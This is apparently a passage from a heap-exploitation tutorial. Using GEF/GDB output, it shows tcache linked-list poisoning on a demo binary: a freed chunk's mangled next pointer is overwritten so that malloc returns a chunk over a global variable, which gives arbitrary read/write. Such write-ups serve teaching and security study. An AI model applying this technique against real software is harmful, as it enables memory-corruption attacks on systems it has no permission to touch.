0x00007fffffffdf80│+0x0000: 0x00005555555596b0  →  0x0000000555555559     ← $rsp
0x00007fffffffdf88│+0x0008: 0x00005555555597e0  →  0x000055500000c3e9
0x00007fffffffdf90│+0x0010: 0x0000555555559910  →  0x000055500000c2b9
0x00007fffffffdf98│+0x0018: 0x000055500000d549
0x00007fffffffdfa0│+0x0020: 0x0000000000001000
0x00007fffffffdfa8│+0x0028: 0x00005555555550e0  →  <_start+0> endbr64
0x00007fffffffdfb0│+0x0030: 0x0000000000000001     ← $rbp
0x00007fffffffdfb8│+0x0038: 0x00007ffff7c29d90  →  <__libc_start_call_main+128> mov edi, eax
──────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x55555555549c <main+723>   	call   0x5555555550b0 <printf@plt>
   0x5555555554a1 <main+728>   	mov	rdx, QWORD PTR [rbp-0x18]
   0x5555555554a5 <main+732>   	mov	rax, QWORD PTR [rbp-0x20]
 → 0x5555555554a9 <main+736>   	mov	QWORD PTR [rax], rdx
   0x5555555554ac <main+739>   	lea	rax, [rip+0x1105]    	# 0x5555555565b8
   0x5555555554b3 <main+746>   	mov	rdi, rax
   0x5555555554b6 <main+749>   	call   0x5555555550a0 <puts@plt>
   0x5555555554bb <main+754>   	mov	edi, 0x100
   0x5555555554c0 <main+759>   	call   0x5555555550d0 <malloc@plt>
──────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "tcache_linked_l", stopped 0x5555555554a9 in main (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x5555555554a9 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  p $rax
$2 = 0x555555559910
gef➤  p $rdx
$3 = 0x55500000d549
gef➤  x/20g 0x555555559900
0x555555559900:    0x0    0x111
0x555555559910:    0x55500000c2b9    0x4c235937ad9d2c4
0x555555559920:    0x0    0x0
0x555555559930:    0x0    0x0
0x555555559940:    0x0    0x0
0x555555559950:    0x0    0x0
0x555555559960:    0x0    0x0
0x555555559970:    0x0    0x0
0x555555559980:    0x0    0x0
0x555555559990:    0x0    0x0
gef➤  si
0x00005555555554ac in main ()

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0000555555559910  →  0x000055500000d549
$rbx   : 0x0          	 
$rcx   : 0x1          	 
$rdx   : 0x55500000d549    
$rsp   : 0x00007fffffffdf80  →  0x00005555555596b0  →  0x0000000555555559
$rbp   : 0x00007fffffffdfb0  →  0x0000000000000001
$rsi   : 0x00005555555592a0  →  "So in this instance, the next ptr should be ((0x55[...]"
$rdi   : 0x00007fffffffda20  →  0x00007ffff7c620d0  →  <funlockfile+0> endbr64
$rip   : 0x00005555555554ac  →  <main+739> lea rax, [rip+0x1105]    	# 0x5555555565b8
$r8	: 0x0          	 
$r9	: 0x00007fffffffde4c  →  "55500000d549"
$r10   : 0x0          	 
$r11   : 0x246        	 
$r12   : 0x00007fffffffe0c8  →  0x00007fffffffe3c6  →  "/Hackery/shogun/pwn_demos/tcache/tcache_l[...]"
$r13   : 0x00005555555551c9  →  <main+0> endbr64
$r14   : 0x0000555555557da0  →  0x0000555555555180  →  <__do_global_dtors_aux+0> endbr64
$r15   : 0x00007ffff7ffd040  →  0x00007ffff7ffe2e0  →  0x0000555555554000  →   jg 0x555555554047
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdf80│+0x0000: 0x00005555555596b0  →  0x0000000555555559     ← $rsp
0x00007fffffffdf88│+0x0008: 0x00005555555597e0  →  0x000055500000c3e9
0x00007fffffffdf90│+0x0010: 0x0000555555559910  →  0x000055500000d549
0x00007fffffffdf98│+0x0018: 0x000055500000d549
0x00007fffffffdfa0│+0x0020: 0x0000000000001000
0x00007fffffffdfa8│+0x0028: 0x00005555555550e0  →  <_start+0> endbr64
0x00007fffffffdfb0│+0x0030: 0x0000000000000001     ← $rbp
0x00007fffffffdfb8│+0x0038: 0x00007ffff7c29d90  →  <__libc_start_call_main+128> mov edi, eax
──────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x5555555554a1 <main+728>   	mov	rdx, QWORD PTR [rbp-0x18]
   0x5555555554a5 <main+732>   	mov	rax, QWORD PTR [rbp-0x20]
   0x5555555554a9 <main+736>   	mov	QWORD PTR [rax], rdx
 → 0x5555555554ac <main+739>   	lea	rax, [rip+0x1105]    	# 0x5555555565b8
   0x5555555554b3 <main+746>   	mov	rdi, rax
   0x5555555554b6 <main+749>   	call   0x5555555550a0 <puts@plt>
   0x5555555554bb <main+754>   	mov	edi, 0x100
   0x5555555554c0 <main+759>   	call   0x5555555550d0 <malloc@plt>
   0x5555555554c5 <main+764>   	mov	QWORD PTR [rbp-0x10], rax
──────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "tcache_linked_l", stopped 0x5555555554ac in main (), reason: SINGLE STEP
────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x5555555554ac → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x/20g 0x555555559900
0x555555559900:    0x0    0x111
0x555555559910:    0x55500000d549    0x4c235937ad9d2c4
0x555555559920:    0x0    0x0
0x555555559930:    0x0    0x0
0x555555559940:    0x0    0x0
0x555555559950:    0x0    0x0
0x555555559960:    0x0    0x0
0x555555559970:    0x0    0x0
0x555555559980:    0x0    0x0
0x555555559990:    0x0    0x0
gef➤  heap bins
──────────────────────────────────────── Tcachebins for thread 1 ────────────────────────────────────────
Tcachebins[idx=15, size=0x110, count=2] ←  Chunk(addr=0x555555559910, size=0x110, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x555555558010, size=0x555555558008, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  [Corrupted chunk at 0x555555558010]
───────────────────────────────── Fastbins for arena at 0x7ffff7e19c80 ─────────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
─────────────────────────────── Unsorted Bin for arena at 0x7ffff7e19c80 ───────────────────────────────
[+] Found 0 chunks in unsorted bin.
──────────────────────────────── Small Bins for arena at 0x7ffff7e19c80 ────────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
──────────────────────────────── Large Bins for arena at 0x7ffff7e19c80 ────────────────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
gef➤  x/x 0x555555558010
0x555555558010 <target>:    0x00000000deadbeef

```

So we see that we set the next ptr of the tcache chunk to `0x55500000d549`. We also see that `heap bins` reports that the tcache chunk present at `target` is corrupted, since its next ptr is not set right. Now, let's allocate the current tcache bin head, to move the head up to `target`:

```
gef➤  c
Continuing.
Now that we've set the next ptr of chunk2 to be that of target, let's reallocate chunk2.


Breakpoint 3, 0x00005555555554c5 in main ()

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0000555555559910  →  0x000055500000d549
$rbx   : 0x0          	 
$rcx   : 0x2          	 
$rdx   : 0x0000555555559010  →  0x0000000000000000
$rsp   : 0x00007fffffffdf80  →  0x00005555555596b0  →  0x0000000555555559
$rbp   : 0x00007fffffffdfb0  →  0x0000000000000001
$rsi   : 0x0000555555558010  →  <target+0> out dx, eax
$rdi   : 0x1f         	 
$rip   : 0x00005555555554c5  →  <main+764> mov QWORD PTR [rbp-0x10], rax
$r8	: 0x0          	 
$r9	: 0x00007fffffffde4c  →  "55500000d549"
$r10   : 0x0          	 
$r11   : 0x246        	 
$r12   : 0x00007fffffffe0c8  →  0x00007fffffffe3c6  →  "/Hackery/shogun/pwn_demos/tcache/tcache_l[...]"
$r13   : 0x00005555555551c9  →  <main+0> endbr64
$r14   : 0x0000555555557da0  →  0x0000555555555180  →  <__do_global_dtors_aux+0> endbr64
$r15   : 0x00007ffff7ffd040  →  0x00007ffff7ffe2e0  →  0x0000555555554000  →   jg 0x555555554047
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdf80│+0x0000: 0x00005555555596b0  →  0x0000000555555559     ← $rsp
0x00007fffffffdf88│+0x0008: 0x00005555555597e0  →  0x000055500000c3e9
0x00007fffffffdf90│+0x0010: 0x0000555555559910  →  0x000055500000d549
0x00007fffffffdf98│+0x0018: 0x000055500000d549
0x00007fffffffdfa0│+0x0020: 0x0000000000001000
0x00007fffffffdfa8│+0x0028: 0x00005555555550e0  →  <_start+0> endbr64
0x00007fffffffdfb0│+0x0030: 0x0000000000000001     ← $rbp
0x00007fffffffdfb8│+0x0038: 0x00007ffff7c29d90  →  <__libc_start_call_main+128> mov edi, eax
──────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x5555555554b6 <main+749>   	call   0x5555555550a0 <puts@plt>
   0x5555555554bb <main+754>   	mov	edi, 0x100
   0x5555555554c0 <main+759>   	call   0x5555555550d0 <malloc@plt>
 → 0x5555555554c5 <main+764>   	mov	QWORD PTR [rbp-0x10], rax
   0x5555555554c9 <main+768>   	mov	rax, QWORD PTR [rbp-0x10]
   0x5555555554cd <main+772>   	mov	rsi, rax
   0x5555555554d0 <main+775>   	lea	rax, [rip+0x113b]    	# 0x555555556612
   0x5555555554d7 <main+782>   	mov	rdi, rax
   0x5555555554da <main+785>   	mov	eax, 0x0
──────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "tcache_linked_l", stopped 0x5555555554c5 in main (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x5555555554c5 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  p $rax
$4 = 0x555555559910
gef➤  heap bins
──────────────────────────────────────── Tcachebins for thread 1 ────────────────────────────────────────
Tcachebins[idx=5864062015486, size=0x555555558000, count=1] ←  Chunk(addr=0x555555558010, size=0x555555558008, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  [Corrupted chunk at 0x555555558010]
───────────────────────────────── Fastbins for arena at 0x7ffff7e19c80 ─────────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
─────────────────────────────── Unsorted Bin for arena at 0x7ffff7e19c80 ───────────────────────────────
[+] Found 0 chunks in unsorted bin.
──────────────────────────────── Small Bins for arena at 0x7ffff7e19c80 ────────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
──────────────────────────────── Large Bins for arena at 0x7ffff7e19c80 ────────────────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
gef➤  x/80x tcache
0x555555559010:    0x0000000000000000    0x0000000000000000
0x555555559020:    0x0000000000000000    0x0002000000000000
0x555555559030:    0x0000000000000000    0x0000000000000000
0x555555559040:    0x0000000000000000    0x0000000000000000
0x555555559050:    0x0000000000000000    0x0000000000000000
0x555555559060:    0x0000000000000000    0x0000000000000000
0x555555559070:    0x0000000000000000    0x0000000000000000
0x555555559080:    0x0000000000000000    0x0000000000000000
0x555555559090:    0x0000000000000000    0x0000000000000000
0x5555555590a0:    0x0000000000000000    0x0000000000000000
0x5555555590b0:    0x0000000000000000    0x0000000000000000
0x5555555590c0:    0x0000000000000000    0x0000000000000000
0x5555555590d0:    0x0000000000000000    0x0000000000000000
0x5555555590e0:    0x0000000000000000    0x0000000000000000
0x5555555590f0:    0x0000000000000000    0x0000000000000000
0x555555559100:    0x0000000000000000    0x0000555555558010
0x555555559110:    0x0000000000000000    0x0000000000000000
0x555555559120:    0x0000000000000000    0x0000000000000000
0x555555559130:    0x0000000000000000    0x0000000000000000
0x555555559140:    0x0000000000000000    0x0000000000000000
0x555555559150:    0x0000000000000000    0x0000000000000000
0x555555559160:    0x0000000000000000    0x0000000000000000
0x555555559170:    0x0000000000000000    0x0000000000000000
0x555555559180:    0x0000000000000000    0x0000000000000000
0x555555559190:    0x0000000000000000    0x0000000000000000
0x5555555591a0:    0x0000000000000000    0x0000000000000000
0x5555555591b0:    0x0000000000000000    0x0000000000000000
0x5555555591c0:    0x0000000000000000    0x0000000000000000
0x5555555591d0:    0x0000000000000000    0x0000000000000000
0x5555555591e0:    0x0000000000000000    0x0000000000000000
0x5555555591f0:    0x0000000000000000    0x0000000000000000
0x555555559200:    0x0000000000000000    0x0000000000000000
0x555555559210:    0x0000000000000000    0x0000000000000000
0x555555559220:    0x0000000000000000    0x0000000000000000
0x555555559230:    0x0000000000000000    0x0000000000000000
0x555555559240:    0x0000000000000000    0x0000000000000000
0x555555559250:    0x0000000000000000    0x0000000000000000
0x555555559260:    0x0000000000000000    0x0000000000000000
0x555555559270:    0x0000000000000000    0x0000000000000000
0x555555559280:    0x0000000000000000    0x0000000000000000
```

So we see that the head of the tcache bin is `0x0000555555558010`, which is the address of `target`. Since the tcache count for that bin is `2`, the next allocation from that tcache bin should be to the target global variable. Let's see that in action:

```
gef➤  c
Continuing.
New chunk allocated: 0x555555559910

Now the head of the tcahce bin should be to the target global variable.
The next allocation should be to the address it's stored at.


Breakpoint 4, 0x000055555555550c in main ()

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0000555555558010  →  <target+0> out dx, eax
$rbx   : 0x0          	 
$rcx   : 0x1          	 
$rdx   : 0x0000555555559010  →  0x0000000000000000
$rsp   : 0x00007fffffffdf80  →  0x00005555555596b0  →  0x0000000555555559
$rbp   : 0x00007fffffffdfb0  →  0x0000000000000001
$rsi   : 0x58bf8ebb7  	 
$rdi   : 0x1f         	 
$rip   : 0x000055555555550c  →  <main+835> mov QWORD PTR [rbp-0x8], rax
$r8	: 0x0          	 
$r9	: 0x00007fffffffde4c  →  "555555559910"
$r10   : 0x0          	 
$r11   : 0x246        	 
$r12   : 0x00007fffffffe0c8  →  0x00007fffffffe3c6  →  "/Hackery/shogun/pwn_demos/tcache/tcache_l[...]"
$r13   : 0x00005555555551c9  →  <main+0> endbr64
$r14   : 0x0000555555557da0  →  0x0000555555555180  →  <__do_global_dtors_aux+0> endbr64
$r15   : 0x00007ffff7ffd040  →  0x00007ffff7ffe2e0  →  0x0000555555554000  →   jg 0x555555554047
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdf80│+0x0000: 0x00005555555596b0  →  0x0000000555555559     ← $rsp
0x00007fffffffdf88│+0x0008: 0x00005555555597e0  →  0x000055500000c3e9
0x00007fffffffdf90│+0x0010: 0x0000555555559910  →  0x000055500000d549
0x00007fffffffdf98│+0x0018: 0x000055500000d549
0x00007fffffffdfa0│+0x0020: 0x0000555555559910  →  0x000055500000d549
0x00007fffffffdfa8│+0x0028: 0x00005555555550e0  →  <_start+0> endbr64
0x00007fffffffdfb0│+0x0030: 0x0000000000000001     ← $rbp
0x00007fffffffdfb8│+0x0038: 0x00007ffff7c29d90  →  <__libc_start_call_main+128> mov edi, eax
──────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x5555555554fd <main+820>   	call   0x5555555550a0 <puts@plt>
   0x555555555502 <main+825>   	mov	edi, 0x100
   0x555555555507 <main+830>   	call   0x5555555550d0 <malloc@plt>
 → 0x55555555550c <main+835>   	mov	QWORD PTR [rbp-0x8], rax
   0x555555555510 <main+839>   	mov	rax, QWORD PTR [rbp-0x8]
   0x555555555514 <main+843>   	mov	rsi, rax
   0x555555555517 <main+846>   	lea	rax, [rip+0x1198]    	# 0x5555555566b6
   0x55555555551e <main+853>   	mov	rdi, rax
   0x555555555521 <main+856>   	mov	eax, 0x0
──────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "tcache_linked_l", stopped 0x55555555550c in main (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x55555555550c → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  p $rax
$5 = 0x555555558010
gef➤  x/x $rax
0x555555558010 <target>:    0x00000000deadbeef
gef➤  c
Continuing.
New chunk allocated: 0x555555558010
Did this work: Yes

So, we see that we were able to allocate a chunk to the target global variable.
Let's change it's value.

New target value:    0xffffffffffffffff
[Inferior 1 (process 21486) exited with code 045]
```

So we see that we are able to get `malloc` to allocate a chunk from the tcache, pointing directly to the global variable `target`. As long as we know the heap address space, and the address we want to allocate a chunk at, we should be able to do any address we want (assuming there isn't a weird check somewhere preventing particular edge cases). We go on to use that address, to do an arbitrary read/write.
